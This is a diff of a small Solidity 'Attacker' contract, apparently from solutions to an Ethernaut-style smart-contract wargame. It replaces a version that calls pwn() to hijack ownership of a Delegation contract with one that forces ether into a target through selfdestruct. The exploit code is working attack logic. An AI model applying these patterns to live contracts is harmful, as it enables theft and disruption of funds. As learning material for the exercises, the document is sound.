@@ -1,20 +1,19 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import './Delegation.sol';
+import './Force.sol';
 
 contract Attacker {
 
-  address public target;
+  address payable target;
   address public deployer;
 
-  constructor (address _target) public {
+  constructor (address payable _target) public payable {
     target = _target;
     deployer = msg.sender;
   }
 
-  function attack() public {
-    bytes memory msgdata = abi.encodeWithSignature("pwn()");
-    target.call(msgdata);
+  function kill() public {
+    selfdestruct(target);
     }
 }
